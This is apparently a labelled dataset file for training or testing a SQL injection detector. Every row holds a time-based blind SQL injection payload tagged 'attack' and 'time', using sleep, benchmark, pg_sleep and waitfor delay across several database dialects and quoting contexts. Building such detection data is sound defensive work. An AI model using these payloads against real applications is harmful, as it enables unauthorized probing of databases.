label,payload,family
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",time
attack,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'  )   and sleep  (  5  )  #,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,time
attack,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',time
attack,1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,time
attack,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",time
attack,"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'hqcz'  =  'hqcz,time
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,time
attack,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,time
attack," select sleep  (  5  )   and ""oivc"" like ""oivc",time
attack,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,time
attack,"1"" and sleep  (  5  )  #",time
attack,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",time
attack,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",time
attack,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",time
attack,1' in boolean mode  )   waitfor delay '0:0:5'--,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,time
attack,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,time
attack,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",time
attack,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,time
attack,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",time
attack,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt",time
attack,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,1' where 5455  =  5455 and sleep  (  5  )  --,time
attack,"select sleep  (  5  )   and ""jvys"" like ""jvys",time
attack,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,time
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1'  )   waitfor delay '0:0:5',time
attack,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',time
attack,"1%""   )    )    and sleep  (  5  )  #",time
attack,"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",time
attack,1' waitfor delay '0:0:5' and 'dtej' like 'dtej,time
attack," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",time
attack,1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||',time
attack,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,time
attack,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1%""  )   waitfor delay '0:0:5' and   (  ""%""  =  """,time
attack,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,time
attack,"1   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   '%'  =  ',time
attack,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",time
attack,1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1' where 9708  =  9708 or sleep  (  5  )  --,time
attack,"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",time
attack,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',time
attack,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,select sleep  (  5  )  --,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,time
attack,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',time
attack,"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",time
attack,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",time
attack,1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,time
attack,"1"" and sleep  (  5  )  ",time
attack,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,time
attack,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",time
attack,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",time
attack,1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,waitfor delay '0:0:5' and   (  '%'  =  ',time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,time
attack,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,time
attack,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,time
attack,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",time
attack,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",time
attack,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ytxg'  =  'ytxg,time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,time
attack,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx",time
attack,"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,begin user_lock.sleep  (  5  ) ,time
attack,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1 waitfor delay '0:0:5'# opyp,time
attack,"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lqwz'  =  'lqwz",time
attack,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",time
attack,"select sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,"1""  )   where 4038  =  4038 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",time
attack,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,time
attack,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1%'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  '%'  =  ',time
attack,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,time
attack,"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",time
attack,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,time
attack,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",time
attack,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """,time
attack,1  )   where 7165  =  7165 and sleep  (  5  )  #,time
attack,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",time
attack,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",time
attack,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,time
attack,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,1 where 1931  =  1931 and sleep  (  5  )  --,time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,"1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,time
attack,"1""  )   or sleep  (  5  )  #",time
attack,1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',time
attack,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',time
attack,"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",time
attack,"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,time
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,time
attack,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",time
attack,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,time
attack,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,time
attack,1' or sleep  (  5  ) ,time
attack,"1"" waitfor delay '0:0:5'",time
attack,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,time
attack,"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov",time
attack,1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   '%'  =  ',time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,time
attack,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',time
attack,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1' where 1652  =  1652 and sleep  (  5  )  #,time
attack,1 rlike sleep  (  5  )  # urxh,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,time
attack,select sleep  (  5  )   and    (    (     (  8354  =  8354,time
attack,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,time
attack,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,time
attack,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,time
attack,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',time
attack,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,time
attack,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',time
attack,1 or sleep  (  5  )  #,time
attack,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",time
attack,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,time
attack,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",time
attack,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",time
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',time
attack,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack, (  7098  =  7098 and sleep  (  5   )    ) ,time
attack,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",time
attack,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",time
attack,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,time
attack,"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,time
attack,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,time
attack,"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,time
attack,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,time
attack,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",time
attack,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",time
attack,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',time
attack,"1%""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""%""  =  """,time
attack,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,1%'   )    )    rlike sleep  (  5  )  #,time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,time
attack,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",time
attack,1%' or sleep  (  5  )  #,time
attack,1' or sleep  (  5  )   and 'yudo'  =  'yudo,time
attack,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,time
attack,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,time
attack,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj",time
attack,"select sleep  (  5  )   and    (    (   ""twed"" like ""twed",time
attack,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",time
attack,1  )   where 9078  =  9078 rlike sleep  (  5  )  #,time
attack,1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,select pg_sleep  (  5  )   and '%'  =  ',time
attack,"1""   )    )    as casz where 5921  =  5921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',time
attack,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,time
attack,"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,time
attack,1'+  (  select brgo where 9100  =  9100 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""tqbi""  =  ""tqbi",time
attack,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,time
attack,1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",time
attack,"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,time
attack,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,time
attack,select sleep  (  5  )   and   (  4863  =  4863,time
attack,1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",time
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,time
attack,"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1'  )   where 3636  =  3636 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1%'  )   waitfor delay '0:0:5'--,time
attack,"1""  )   as zjwu where 9963  =  9963 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,time
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",time
attack,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',time
attack,1   )    )     )   and sleep  (  5  )  #,time
attack,"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,time
attack,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,time
attack,1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',time
attack,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",time
attack,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",time
attack,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,time
attack,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',time
attack,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   and sleep  (  5  )  #",time
attack,"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1  )   rlike sleep  (  5  ) ,time
attack,select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,time
attack,"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,time
attack,select pg_sleep  (  5  )   and   (  'itgc'  =  'itgc,time
attack,"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,time
attack,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',time
attack,1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,time
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,time
attack,1%'  )   and sleep  (  5  )   and   (  '%'  =  ',time
attack,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,time
attack,"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",time
attack,"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """,time
attack,"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   where 6809  =  6809 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",time
attack,"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,time
attack,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""  )   rlike sleep  (  5  )  #",time
attack,"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",time
attack,"1%"" rlike sleep  (  5  )  #",time
attack,1 waitfor delay '0:0:5',time
attack,"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,time
attack,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,time
attack,1' waitfor delay '0:0:5',time
attack,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",time
